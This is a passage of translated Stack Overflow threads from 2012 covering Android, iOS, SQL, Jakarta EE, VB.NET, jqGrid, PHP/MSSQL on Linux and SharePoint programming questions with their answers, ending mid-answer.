09-04 13:29:56.840: E/AndroidRuntime(574): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.example.fast/com.example.fast.MainActivity}: java.lang.RuntimeException: Your content must have a ListView whose id attribute is 'android.R.id.list'
09-04 13:29:56.840: E/AndroidRuntime(574):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1956)
09-04 13:29:56.840: E/AndroidRuntime(574):  at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1981)
09-04 13:29:56.840: E/AndroidRuntime(574):  at android.app.ActivityThread.access$600(ActivityThread.java:123)
09-04 13:29:56.840: E/AndroidRuntime(574):  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1147)
09-04 13:29:56.840: E/AndroidRuntime(574):  at android.os.Handler.dispatchMessage(Handler.java:99)
09-04 13:29:56.840: E/AndroidRuntime(574):  at android.os.Looper.loop(Looper.java:137)
09-04 13:29:56.840: E/AndroidRuntime(574):  at android.app.ActivityThread.main(ActivityThread.java:4424)
09-04 13:29:56.840: E/AndroidRuntime(574):  at java.lang.reflect.Method.invokeNative(Native Method)
09-04 13:29:56.840: E/AndroidRuntime(574):  at java.lang.reflect.Method.invoke(Method.java:511)
09-04 13:29:56.840: E/AndroidRuntime(574):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
09-04 13:29:56.840: E/AndroidRuntime(574):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
09-04 13:29:56.840: E/AndroidRuntime(574):  at dalvik.system.NativeStart.main(Native Method)
09-04 13:29:56.840: E/AndroidRuntime(574): Caused by: java.lang.RuntimeException: Your content must have a ListView whose id attribute is 'android.R.id.list'
09-04 13:29:56.840: E/AndroidRuntime(574):  at android.app.ListActivity.onContentChanged(ListActivity.java:243)
09-04 13:29:56.840: E/AndroidRuntime(574):  at android.preference.PreferenceActivity.onContentChanged(PreferenceActivity.java:944)
09-04 13:29:56.840: E/AndroidRuntime(574):  at com.android.internal.policy.impl.PhoneWindow.setContentView(PhoneWindow.java:254)
09-04 13:29:56.840: E/AndroidRuntime(574):  at android.app.Activity.setContentView(Activity.java:1835)
09-04 13:29:56.840: E/AndroidRuntime(574):  at com.example.fast.MainActivity.onCreate(MainActivity.java:50)
09-04 13:29:56.840: E/AndroidRuntime(574):  at android.app.Activity.performCreate(Activity.java:4465)
09-04 13:29:56.840: E/AndroidRuntime(574):  at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1049)
09-04 13:29:56.840: E/AndroidRuntime(574):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1920)
09-04 13:29:56.840: E/AndroidRuntime(574):  ... 11 more 
```

* * *

我不支持 ListActivity！

我只有：

3个jave文件：

```
"public class MainActivity extends PreferenceActivity  implements OnClickListener"

"public class QuickPrefsActivity  extends PreferenceActivity"

"public class ShowSettingsActivity extends Activity" 
```

所以我不明白问题出在哪里？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T13:35:48.143

请参见

[RuntimeException：您的内容必须有一个 id 属性为 'android.R.id.list' 的 ListView](https://stackoverflow.com/questions/3040374/runtime-exception-listview-whose-id-attribute-is-android-r-id-list)

```
<ListView android:id="@android:id/list"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"/> 
```

如果您仍想使用 ListActivity，这将解决错误。

# ios - 如何在 iPhone 中将十进制值与整数进行比较？

> ID：12264624
> 
> 赞同：0
> 
> 时间：2012-09-04T13:33:18.563
> 
> 标签：ios, validation

嗨，我的最小值为 100，最大值为 400。用户应在此值内输入。如果他们输入 400.5 它不应该接受。那是对我的文本字段的验证。我使用了以下代码

```
 NSNumberFormatter *formatter = [[NSNumberFormatter alloc] init];
                [formatter setNumberStyle:NSNumberFormatterDecimalStyle];
                NSNumber *textFieldNumber = [formatter numberFromString:[dynamicHealthyHeartTxtFld text]];
                NSNumber *MaxNumber = [formatter numberFromString:[[healthyHeartFieldsAry objectAtIndex:getHHTag] objectForKey:@"MaxVal"]];
                NSNumber *MinNumber = [formatter numberFromString:[[healthyHeartFieldsAry objectAtIndex:getHHTag] objectForKey:@"MinVal"]];

                if ([self checkForDecimalValue:dynamicHealthyHeartTxtFld.text]) 
                {

                    if (([textFieldNumber decimalValue] < [MinNumber decimalValue]) || ([textFieldNumber decimalValue] > [MaxNumber decimalValue]) ) {

                        if ([textFieldNumber decimalValue] < [MinNumber decimalValue]) {

                            Custom_Alert *alert=[[Custom_Alert alloc] initWithTitle:@"Alert" message:[NSString stringWithFormat:@"The Value you entered in %@ is outside the acceptable range.Please correct and Continue ",[[healthyHeartFieldsAry objectAtIndex:getHHTag] objectForKey:@"TestName"]] delegate:self cancelButtonTitle:@"OK" otherButtonTitles:nil];
                            [alert show];
                            enterAlert=YES;
                            [alert release];

                        }
                        else
                        {
                            Custom_Alert *alert=[[Custom_Alert alloc] initWithTitle:@"Alert" message:[NSString stringWithFormat:@"The Value you entered is %@ outside the acceptable range.Please correct and Continue",[[healthyHeartFieldsAry objectAtIndex:getHHTag] objectForKey:@"TestName"]] delegate:self cancelButtonTitle:@"OK" otherButtonTitles:nil];
                            [alert show];
                            enterAlert=YES;
                            [alert release];

                        }

                    }

                } 
```

如果我使用此代码。它正在接受 400.5。请帮我解决这个问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T13:47:06.163

您需要将`NSString`您的文本字段返回的转换为`NSNumber`：

```
NSNumberFormatter *formatter = [[NSNumberFormatter alloc] init];
[formatter setNumberStyle:NSNumberFormatterDecimalStyle];
NSNumber *textFieldNumber = [formatter numberFromString:[textField text]]; 
```

然后使用

```
[textFieldNumber decimalValue] > 100.0 && [textFieldNumber decimalValue] < 400 
```

检查范围。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-05T07:52:03.377

我已将 (textfield.text) 字符串转换为双精度值，并将双精度值与双精度值进行比较。它工作正常。感谢您的所有回答。

# jakarta-ee - 如何在战争或耳朵之外配置属性或数据源

> ID：12264629
> 
> 赞同：0
> 
> 时间：2012-09-04T13:33:45.393
> 
> 标签：jakarta-ee

我需要在一个容器中部署多次相同的战争或耳朵。我将更改档案的名称，以便为每个应用程序提供不同的上下文。我需要将属性传递给每个战争或耳朵，而无需编辑每个档案的内容。

有什么办法吗，例如在耳朵外声明一个 env-entry ？

我该如何处理数据源？有没有间接机制？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T13:43:13.020

例如，在 Glassfish 上，您可以在管理控制台的容器上下文中完全配置数据源。您给它们一个名称（一个 JNDI 名称？）并通过您的应用程序中的该名称访问它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T21:17:51.907

包含机制取决于使用框架。例如对于 Spring 框架，您可以使用类似这样的东西（并将属性文件放在任何类路径文件夹中）：

```
<bean class="org.springframework.beans.factory.config.PropertyPlaceholderConfigurer">
    <property name="location">
        <value>classpath:database.properties</value>
    </property>
</bean> 
```

您能否澄清您正在使用的框架 - 它可以提供帮助。

# sql - Query to return 1 row of each duplicate

> ID：12264640
> 
> 赞同：0
> 
> 时间：2012-09-04T13:34:12.637
> 
> 标签：sql

I am using MS SQL 2008R2\. I am working with a partial data set (i.e. not all colunms) and have not been able to exclude duplicate rows. For example, here are the rows for a claim:

```
Claim       Line Doctor Received    Paid
02195111345 1    22924  1995-11-13  2001-10-02  
02195111345 1    22924  1995-11-13  2001-10-02  
02195111345 2    22924  1995-11-13  2001-10-02  
02195111345 2    22924  1995-11-13  2001-10-02  
02195111345 3    22924  1995-11-13  2001-10-02  
02195111345 3    22924  1995-11-13  2001-10-02  
02195111345 4    22924  1995-11-13  2001-10-02  
02195111345 4    22924  1995-11-13  2001-10-02  
02195111345 5    22924  1995-11-13  2001-10-02  
02195111345 5    22924  1995-11-13  2001-10-02 
```

I want to select only 1 row for each Claim+Line. There are additional columns, but they contain the same information for each combination of Claim+Line.

I can easily identify the rows with duplicates with a query such as:

```
SELECT [ClaimNum],[ClaimNum_Line]
FROM [dbo].[DamagedClaims]
GROUP BY [ClaimNum],[ClaimNum_Line]
HAVING COUNT(*) > 1 
```

Typically, I would create a derived table using this query and join it back to the table - with another coulmn such as MAX(Version) or such, but there are no such columns with which to differentiate the duplicates.

I have considered

```
SELECT ClaimNum], Line, MAX(DOCTOR), MAX([Date Received]), MAX([Date Paid]) 
```

but there are about 20 columns and 750 million rows and that seemed like a lot of overhead (I am very sympathetic to our SQL Servers!). Is there a better solution?

Best, Scott

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T13:35:45.663

just add `DISTINCT` in your `SELECT`

```
SELECT DISTINCT Claim, Line, Doctor, Received, Paid
FROM tableName 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-04T14:09:07.633

I see no column that can be the basis of you maximum row, try using `DISTINCT`

```
SELECT DISTINCT *
FROM tableA 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-04T13:36:26.583

Using `SELECT DISTINCT` - [http://www.w3schools.com/sql/sql_distinct.asp](http://www.w3schools.com/sql/sql_distinct.asp)

# android - 如何通过在手机中安装我的应用程序在 android 手机中安装印地语键盘？

> ID：12264654
> 
> 赞同：1
> 
> 时间：2012-09-04T13:35:02.297
> 
> 标签：android, keyboard, hindi

我正在开发一个在其中显示印地语字体的应用程序，还有一个用于搜索字符串的编辑文本。
我还需要搜索印地语文本，因此只想在安装我的应用程序时安装印地语键盘/输入法。
我不想为印地语键盘安装/使用任何其他市场应用程序。

我是android新手，所以请任何人指导我..

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-02-24T18:06:32.487

[印地语键盘，用于向我的应用程序输入值](https://stackoverflow.com/questions/21015588/hindi-keyboard-for-input-values-to-my-application/21995572#21995572)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T06:32:38.983

我不知道他们是否是使用“印地语键盘”的严格要求。如果是这样，我的答案将无效。

但是，如果您可以使用不同的输入机制，我认为您可以使用[音译](http://www.google.com/transliterate)来输入您的字符串。在一般情况下，实现并不复杂。（无论如何对印地语没有明确的想法）您必须检测字符序列并适当地替换。

# vb.net - 如何在以下函数中显示来自用户的多个选定值？

> ID：12264657
> 
> 赞同：0
> 
> 时间：2012-09-04T13:35:11.220
> 
> 标签：vb.net

```
Public Function StartTableCell( _
  Optional ByVal align As String = "", _
  Optional ByVal valign As String = "", _
  Optional ByVal colspan As String = "", _
  Optional ByVal rowspan As String = "", _
  Optional ByVal width As String = "", _
  Optional ByVal height As String = "") As String

    Dim _StrBuil As New StringBuilder()

End Function 
```

如何显示调用者传入值的参数中的值？例如，如果`align`它`""`不应该显示。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T13:55:20.293

`StringBuilder`最简单的方法是检查每个参数并逐个构建。

例如：

```
Dim _StrBuil As New StringBuilder()
If Not String.IsNullOrEmpty(align)
    _StrBuil.Append(("align: """ + align + """")
End If
If Not String.IsNullOrEmpty(valign)
    _StrBuil.Append(("valign: """ + valign + """")
End If 
'etc.  
Return "<td " + _StrBuil.ToString + ">" 
```

# javascript - 使用 jqGrid 进行内联编辑时在表格上方显示表单控件

> ID：12264658
> 
> 赞同：6
> 
> 时间：2012-09-04T13:35:13.747
> 
> 标签：javascript, jquery, css, jqgrid, textarea

我正在使用启用内联编辑的 jqGrid。问题是某些字段的内容很长，并且默认情况下该字段不够大而无法使用：

![jqGrid textarea - 现在怎么样了](../Images/cec9c49d6a61221ac7b2cc181291113b.png)

我想要做的是为 textarea 设置一个固定的宽度，并让它在获得焦点时展开以在表格*上方可见。*像这样的东西：

![jqGrid textarea - 我希望它看起来如何](../Images/eb35202b9baaeed269faa0bb094bae2e.png)

我可以在 中设置 textarea 的 CSS `editoptions:dataInit`，但是如果我只是增加宽度，则 textarea 的右侧会在表格单元格的末尾被剪掉。我想我可以用一些聪明的 CSS 来解决这个问题？

顺便说一句，我知道弹出式编辑器可能对此更有意义，但客户坚持认为它仍然是内联编辑器。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-05T08:47:09.600

如果我正确理解您的要求，您希望拥有`textarea`更大的网格对应单元格。在这种情况下，我可以建议您将位置更改`textarea`为“绝对”。在这种情况下，可以调整大小`textarea`并获得类似的结果

![在此处输入图像描述](../Images/636422c746aaa1ed786e4ba2808d8af1.png)

您如何看到大的`textarea`将与其他输入控件重叠。为了能够修改所有输入字段并使输入`textarea`更舒适，我建议另外使用[jQuery.resizable()](http://jqueryui.com/demos/resizable/)。所以一个人将能够调整`textarea`：

![在此处输入图像描述](../Images/bd22ef6734fb1507ca2212767b071586.png)

[您将在此处](http://www.ok-soft-gmbh.com/jqGrid/textareaEdit1.htm)找到相应的演示。代码中最重要的部分如下：

```
onSelectRow: function (rowid, status, e) {
    var $this = $(this);
    if (rowid !== lastSel) {
        if (lastSel) {
            $(this).jqGrid('saveRow', lastSel);
        }
        lastSel = rowid;
    }
    $this.jqGrid('editRow', rowid, {
        keys: true,
        oneditfunc: function(id) {
            var $textareas = $("#" + id + " textarea");
            $textareas.each(function() {
                var $textarea = $(this);
                $textarea.css({position: "absolute", zIndex: "auto", width: "200px"});
                $textarea.position({
                    of: $textarea.parent(),
                    my: "left top",
                    at: "left top",
                    offset: "1 1"
                });
                $textarea.resizable();
                // now we fix position of the resizable wrapper which is
                // the parent of the textarea after calling of .resizable()
                $textarea.parent().css({
                    "padding-bottom": "0px",
                    "padding-right": "0px"
                });
                // change focus to the control from the clicked cell
                $("input,select,textarea", e.target).focus();
            });
        }
    });
    return true;
} 
```

在上面的代码中，我还使用了将焦点设置在单击的单元格上的技巧，就像我最初在[答案](https://stackoverflow.com/a/6538102/315935)中描述的那样。

为了使我的建议与标准 jqGrid 行为的差异更加清晰，我建议将上述演示与[以下](http://www.ok-soft-gmbh.com/jqGrid/textareaedit.htm)显示的演示进行比较

![在此处输入图像描述](../Images/3bec4a842ebaa7c0a1f6e65a874ce7bc.png)

**更新**：写完答案后，我[将功能请求](http://www.trirand.com/blog/?page_id=393/feature-request/calling-of-datainit-and-dataevents-after-the-control-are-placed-on-the-page/#p27265)发布到 trirand。实施上述建议的最大问题之一是无法将设置位置的代码完全移动`textarea`到“绝对”`dataInit`中。功能请求中的建议将使之成为可能。

# sql - sql查询-需要根据Datefield提取记录

> ID：12264669
> 
> 赞同：0
> 
> 时间：2012-09-04T13:35:42.650
> 
> 标签：sql, sql-server

我需要在每个月的最后一个星期一从 Table1 中提取数据并将其插入到 Table2 中。我的表的基本版本是这样的..

表 1（ID、姓名、生效日期）

表 2（ID、名称、EffectiveDate、ProcessDate）

我只想提取那些 Effectivedate 从当前日期起 4 个月的记录（例如：如果 EffectiveDate 是 1 月 1 日，那么它应该在 4 月 1 日之后提取......）。实际上 Table2 用于报告目的，所以我们有“processDate”字段，我们可以在过滤时使用。

任何帮助将不胜感激..谢谢

编辑：

好吧，我知道我们可以做这样的事情

有效日期 < DATEADD(MM,-4,GetDate())

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T13:40:18.747

像这样的东西？

```
SELECT * FROM Table1 WHERE EffectiveDate >= DATEADD(mm, -4, GETDATE()) 
```

更新：

所以你想要 4 个月前的所有记录？然后只需切换 < 运算符：

```
SELECT * FROM Table1 WHERE EffectiveDate <= DATEADD(mm, -4, GETDATE()) AND processed = 0 
```

更新 2：

尝试这个：

```
SELECT 
    * 
FROM Table1 
    LEFT JOIN Table2 ON Table1.ID = Table2.ID 
WHERE 
    Table1.EffectiveDate <= DATEADD(mm, -4, GETDATE())
    AND Table2.ProcessedDate IS NULL 
```

# php - Linux 上的 SQL Server 2005 扩展

> ID：12264672
> 
> 赞同：2
> 
> 时间：2012-09-04T13:35:53.043
> 
> 标签：php, sql, sql-server, linux, webserver

有谁知道如何在 Linux 网络服务器上安装 Ms SQL 扩展 2005？网络服务器目前有 FreeTDS 库版本，我不知道这意味着什么。但是当我尝试连接时，它并没有说“mssql_connect() 不存在”，而是说“无法连接到服务器：xx.xx.xx.xx”

我想这是因为扩展的版本，因为我在带有 ntwdblib.dll 的 Windows 上发生了这个问题。但我不知道如何在 Linux 上解决这个问题。

我只需要使用这些功能。该数据库位于 Windows 服务器上，因此我想使用 mssql_connect() 连接到它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-22T13:11:33.473

可以使用`mssql_*`FreeTDS 库在 Linux 上使用函数，但需要将支持编译成 PHP 二进制文件 ( `--with-mssql`)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-22T13:24:58.880

您是否安装了 unixODBC 模块？ **sudo apt-get install unixodbc**

您是否为 PHP 安装了 ODBC 支持？ **sudo apt-get install php5-odbc**

您是否在 odbc.ini 和 odbcinst.ini 文件中定义了与 Microsoft Sequel Server 的连接？

```
odbc.ini

# Define a connection to the MSSQL server.
# The Description can be whatever we want it to be.
# The Driver value must match what we have defined in /etc/odbcinst.ini
# The Database name must be the name of the database this connection will connect to.
# The ServerName is the name we defined in /etc/freetds/freetds.conf
# The TDS_Version should match what we defined in /etc/freetds/freetds.conf
[msft_sql_server]
Description             = The Microsoft Sequel Server
Driver                  = freetds
Database                = XXXXXXXXXX
ServerName              = msft_sql_server
TDS_Version             = 8.0

odbcinst.ini

# Define where to find the driver for the Free TDS connections.
[freetds]
Description     = MS SQL database access with Free TDS
Driver          = /usr/lib/i386-linux-gnu/odbc/libtdsodbc.so
Setup           = /usr/lib/i386-linux-gnu/odbc/libtdsS.so
UsageCount      = 1 
```

然后您的 PHP 连接将如下所示：

```
$db_connection = new PDO("dblib:dbname=$database_server;host=$database_server", $db_username, $db_password); 
```

您可以使用 iSQL 程序测试上述设置，以确保您可以建立连接。

如果您仍然无法从 Linux 服务器连接到 MSFT 服务器 - 是否有防火墙阻碍？您确定您拥有有效的用户凭据吗？MSFT 服务器会接受来自远程客户端的连接吗？

# android - Intent 和 Parcelable 对象 Android

> ID：12264678
> 
> 赞同：8
> 
> 时间：2012-09-04T13:36:06.060
> 
> 标签：android, android-intent, parcelable

为什么我需要打包我的对象，即使我只需要将它发送到同一任务的另一个线程？实际上，我需要打开一个甚至可以在同一个线程（主线程）上运行的活动。

换句话说，为什么 Google 不提供一个 startActivity 版本，它采用通用对象广告参数而不是捆绑包来让我启动一个活动，以防我知道它在同一个进程中或（大多数时候）甚至相同线程（主要的）？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-09-04T15:15:55.500

您不需要使用 Parcelable 将对象从一个活动传递到另一个活动。您可以将对象的引用存储在静态成员变量中，如下所示：

```
public class Globals {
     public static MyObject myObject;
} 
```

现在，在包含该对象的代码中，您只需执行以下操作：

```
Globals.myObject = object; 
```

在新活动中，您可以像这样获得它：

```
doSomethingWith(Globals.myObject); 
```

现在，话虽如此，您需要注意以下几点：

如果您的应用程序几乎随时都在后台，Android 可以终止您的进程。当用户然后返回到您的应用程序时，Android 将为您的应用程序创建一个新进程，然后它将**仅重新创建位于活动堆栈顶部的活动**（即：正在显示的活动）。在这种情况下，新创建的活动将无法通过访问获取 iobject，`Globals.myObject`因为该进程是新创建的，并且该成员变量为空。

要解决这个问题，您可以：

1.  确定您的进程已被终止并重新启动（通过检查`Globals.myObject == null`并做出相应的反应 - 告诉用户他需要返回，或者只是自己返回，或显示对话框或其他）
2.  当 Android 在您的活动中调用时保存对象`onSaveInstanceState()`（Android 将在将您的应用程序发送到后台之前执行此操作）并在`onCreate()`

希望这既能回答您的问题，又能解释如何处理它。

**编辑：添加更多关于为什么 Intents 包含序列化（Parcelable）对象而不是对象本身的信息**

1.  当您调用时`startActivity()`，`startService()`Android 可能最终会在另一个进程中启动活动或服务。在这种情况下，如果您在 Intent 中传递了一个对象，Android 将需要序列化该对象以将其传递给其他进程。由于 Android 使用“隐式 Intent 解析”来确定哪个组件可以处理 Intent，调用者可能知道也可能不知道哪个组件将启动。

2.  Android 保存 Intent 的内容有多种原因：

    A. Android 可以随时终止进程。如果这样做并且用户想要返回到应用程序，Android 会创建一个新进程，然后根据需要在该进程中重新创建活动。要创建活动，Android 还需要使 Intent 可用于活动。如果该进程已被终止，则必须保存和恢复 Intent 中的任何“对象”。因为 Intent 包含序列化的对象，所以根据需要重新创建这些对象不是问题。B. PendingIntents 被 Android 用作操作系统作为 Intent 发送者的代理的一种方式。Android 组件可以创建一个 PendingIntent 并将其提供给操作系统，以便它可以在以后触发该 Intent 的发送。在实际发送 PendingIntent 时，发送组件可能处于活动状态，也可能不处于活动状态。这意味着可以在 PendingIntent 中传递的任何对象都必须能够被序列化，这样即使调用组件不再存在，Android 也可以保留它。

3.  Intent 并不打算作为组件之间的一般“参数传递”机制。当然你可以这样使用它，但你也可以使用其他（更简单的）机制。在给定的进程中，您可以使用标准 Java 机制传递对象。为此使用静态（类）变量没有任何问题。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-11T18:15:12.613

Android 官方文档（在 FAQ 中）提供了很多关于如何传递复杂数据结构的信息。

**如何在单个应用程序中的活动/服务之间传递数据？** [http://developer.android.com/guide/faq/framework.html#3](http://developer.android.com/guide/faq/framework.html#3)

> **原始数据类型**
> 
> 要在应用程序中的活动/服务之间共享原始数据，请使用 Intent.putExtras()。为了传递需要持久化的原始数据，请使用 Preferences 存储机制。非持久对象
> 
> **对于短期共享复杂的非持久性用户定义对象，建议采用以下方法：**
> 
> **单例类**
> 
> 您可以通过使用单例来利用您的应用程序组件在同一进程中运行这一事实。这是一个设计为只有一个实例的类。它有一个名为 getInstance() 的静态方法，它返回实例；第一次调用此方法时，它会创建全局实例。因为所有调用者都获得相同的实例，所以他们可以将其用作交互点。例如，活动 A 可以检索实例并调用 setValue(3)；稍后的活动 B 可能会检索实例并调用 getValue() 以检索最后设置的值。
> 
> **公共静态字段/方法**
> 
> 使数据可跨活动/服务访问的另一种方法是使用公共静态字段和/或方法。您可以从应用程序中的任何其他类访问这些静态字段。要共享一个对象，创建对象的活动会设置一个静态字段以指向该对象，任何其他想要使用该对象的活动只需访问该静态字段。
> 
> **对象弱引用的 HashMap**
> 
> 您还可以使用弱引用的 HashMap 到具有长键的对象。当一个 Activity 想要将一个对象传递给另一个 Activity 时，它只需将该对象放入映射中并通过 Intent Extras 将密钥（这是一个基于计数器或时间戳的唯一 Long）发送给接收者 Activity。接收者活动使用此键检索对象。
> 
> **持久对象**
> 
> 即使应用程序似乎继续运行，系统也可能会选择终止其进程并稍后重新启动它。如果您有数据需要从一个活动调用持续到下一个活动调用，则需要将该数据表示为在通知活动可能会消失时由活动保存的状态。
> 
> **对于共享复杂的持久性用户定义对象，建议采用以下方法：**
> 
> ```
> - Application Preferences
> - Files
> - contentProviders
> - SQLite DB 
> ```
> 
> 如果共享数据需要跨应用程序进程可能被终止的点保留，则将该数据放在持久存储中，如应用程序首选项、SQLite DB、文件或内容提供程序。有关如何使用这些组件的更多详细信息，请参阅数据存储。

**为什么这是必要的：**

因为Android独特的多任务能力和组件生命周期的想法。为了允许用户离开应用程序（比如使用活动 A、B 和 C，以及意图 i1、i2、i3），系统将应用程序分成**[组件](http://developer.android.com/guide/components/fundamentals.html#Components)**。

这样，如果用户使用 Intent i2 启动 Activity B，但接到电话或查看他们的电子邮件，他们可以返回 Activity B，Android 系统可以重新交付 Intent i2。用户可以轻松无缝地从您的应用中中断的地方继续。

通过组件生命周期，您可以更轻松地进入和退出每个单独的组件。它还允许在不同类型的组件之间进行异步通信，例如`BroadcastReceivers`,`Services`和`Activities`.

为此，操作系统执行所谓的“**编组**”。它将数据展*平*为原始数据类型（例如`int`和`char`），以便可以轻松地将其保存在内存中或写入临时存储以供以后检索。

此外，这对于任何类型的 IPC（进程间通信）都是必需的。

使用 an`Intent`允许开发人员让 Android 操作系统执行封送处理——这通常会很乏味（并且可能很困难或有问题）。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-11T16:57:44.193

Android 要求您在任务、活动、线程或服务之间传递的任何对象都必须扁平化为 a`Parcel`或 implement `Serializable`。他们这样做是为了让您可以按值传递对象。当您将对象传递给方法或函数时，您是通过引用传递的。意图被传递给系统，系统决定将你的意图路由到哪里，是启动你的一个活动还是打开另一个应用程序。

如果接收对象不是您的应用程序的一部分，则接收器将无法访问您的应用程序的内存。因此，传递 Object 引用会导致接收应用程序崩溃。通过将对象展平为 Parcel 或 Serializable blob，接收者可以对发送的值进行操作，而无需访问原始引用。如果谷歌要实现一个可以传递基本对象的工具，它将要求他们为所有对象编写深拷贝函数，并且你将需要为所有自定义对象编写深拷贝函数，这会变得非常混乱、缓慢并且会占用相当多的系统内存，这可能会使 VM 溢出。通过为传递对象提供通用的基本设施，它们能够提高性能，减少内存需求，

如前所述，您可以创建对要在活动之间传递的对象的全局引用，只要它们都是您的应用程序的一部分。这不是最优雅的解决方案，并且要求您在使用完引用后将其清空，这样您就不会占用不必要的内存，但它运行得很好。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-04T13:43:35.217

您创建的所有活动仅在 UI 线程上运行。没有其他办法。关于您关于需要包裹物品的问题，实际上这不是唯一的方法。您可以通过使对象也实现 Serializable 接口来传递对象。

在高层次上，Intents 是用于在不同组件之间进行通信的异步消息传递机制，例如：活动、服务和广播接收器。源组件和目标组件可能属于或不属于同一个应用程序（因此是进程），如果需要，Android 框架需要一种标准化的跨进程传递对象的方式。

* * *

## 回答 #5

> 赞同：-3
> 
> 时间：2012-09-04T13:42:15.873

为了在活动/服务/等之间传递您的自定义类对象。使用`Bundle`within `Intent`，您的类必须需要实现`Parcelable`or `Serializable`。

这就是你需要在推入之前包裹你的物体的原因`Bundle`

# ios - 在另一个函数中使用 NSString - iOS

> ID：12264681
> 
> 赞同：-1
> 
> 时间：2012-09-04T13:36:10.833
> 
> 标签：ios, function, nsstring

我在一个函数中有几个值，这些值进入那个函数，我需要另一个函数。

这些是价值观。

```
 NSString *latitude =  [NSString stringWithFormat:@"%f", newLocation.coordinate.latitude];
NSString *longitude =  [NSString stringWithFormat:@"%f", newLocation.coordinate.longitude];
NSString *stringFromDate = [formatter stringFromDate: newLocation.timestamp]; 
```

每次他们找到新位置时，我都需要在另一个函数中将它们发送到我的数据库。

有人知道如何解决吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-04T13:47:54.733

我假设您正在使用 CLLocationManagerDelegate？

因此，当找到一个新位置时，它会发送到此方法：

```
– (void)locationManager:didUpdateToLocation:fromLocation: 
```

从那里您可以调用将值写入数据库并将您的值作为参数传递的方法。例如：

```
– (void)locationManager:(CLLocationManager *)locationManager didUpdateToLocation:(CLLocation *)newLocation fromLocation:(CLLocation *)newLocation {
    NSString *latitude =  [NSString stringWithFormat:@"%f", newLocation.coordinate.latitude];
    NSString *longitude =  [NSString stringWithFormat:@"%f", newLocation.coordinate.longitude];
    NSString *stringFromDate = [formatter stringFromDate: newLocation.timestamp];

    [self myFuntionThatWritesToDatabaseWithLatitude:latitude longitude:longitude date:stringFromDate];
}

- (void)myFuntionThatWritesToDatabaseWithLatitude:(NSString *)latitude longitude:(NSString *)longitude date:(NSString *)stringFromDate {
     // write to Database
} 
```

# sharepoint - 更新/编辑 Sharepoint 2007 用户信息列表 UIL

> ID：12264693
> 
> 赞同：0
> 
> 时间：2012-09-04T13:36:29.227
> 
> 标签：sharepoint, sharepoint-2007, user-information-list

如何通过 C# 代码更新 Sharepoint 2007 用户信息列表 (UIL)？我的代码在以管理员身份登录时工作正常，但是当以简单用户身份登录时，代码会抛出“拒绝访问”错误，因为简单用户无法访问 UIL。我需要一些方法让简单的用户在 UIL 中编辑他自己的信息（比如 EMAIL）。请帮忙。这很重要。我的代码是这样的：

```
string var_UserName = myUsername;
string var_newemail = mynewemail@abc.com;
SPSecurity.RunWithElevatedPrivileges(delegate()
                {
                    using (SPSite site = SPContext.Current.Site)
                   {
                        SPWeb curWeb = site.OpenWeb();

                        SPList userList = SPContext.Current.Web.SiteUserInfoList;
                        StringBuilder queryBuilder = new StringBuilder();
                        queryBuilder.Append(@"<Query>");
                        queryBuilder.Append(@"<OrderBy>");
                        queryBuilder.Append(@"<FieldRef Name='Title' />");
                        queryBuilder.Append(@"</OrderBy>");
                        queryBuilder.Append(@"<Where>");
                        queryBuilder.Append(@"<Eq>");
                        queryBuilder.Append(@"<FieldRef Name='Title' />");
                        queryBuilder.Append(@"<Value Type='Text'>" + var_UserName + "</Value>");
                        queryBuilder.Append(@"</Eq>");
                        queryBuilder.Append(@"</Where>");
                        queryBuilder.Append(@"</Query>");
                        SPQuery query = new SPQuery();
                        query.Query = queryBuilder.ToString();
                        SPListItemCollection oSPListItemCollection = userList.GetItems(query);
                        SPField field = userList.Fields.GetField("E-Mail");

                        foreach (SPItem item in oSPListItemCollection)
                        {
                            if (item["Title"].ToString().ToLower() == Login1.UserName.ToLower())
                            {
                             item[field.InternalName] = var_newemail;
                             curWeb.AllowUnsafeUpdates = true;
                             item.Update(); //throws error when not logged in as administrator
                             curWeb.AllowUnsafeUpdates = false;
                             break; 
                            }
                        }

                    }
                }); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T13:01:33.950

问题是：不要使用“上下文”来创建 spSite 对象，因为它不会创建具有提升权限但具有执行此代码的用户权限的对象，这可能会导致异常/错误。所以我刚刚删除了 Context 对象，它适用于任何用户。宾果游戏 :) 像这样：

```
string var_UserName = myUsername;
string var_newemail = mynewemail@abc.com;
SPSecurity.RunWithElevatedPrivileges(delegate()
            {
               using (SPSite site = new SPSite(Page.Request.Url.ToString())) //Change 1
               {
                    SPWeb curWeb = site.OpenWeb();

                    SPList userList = curWeb.Lists["User Information List"]; //Change 2
                    StringBuilder queryBuilder = new StringBuilder();
                    queryBuilder.Append(@"<Query>");
                    queryBuilder.Append(@"<OrderBy>");
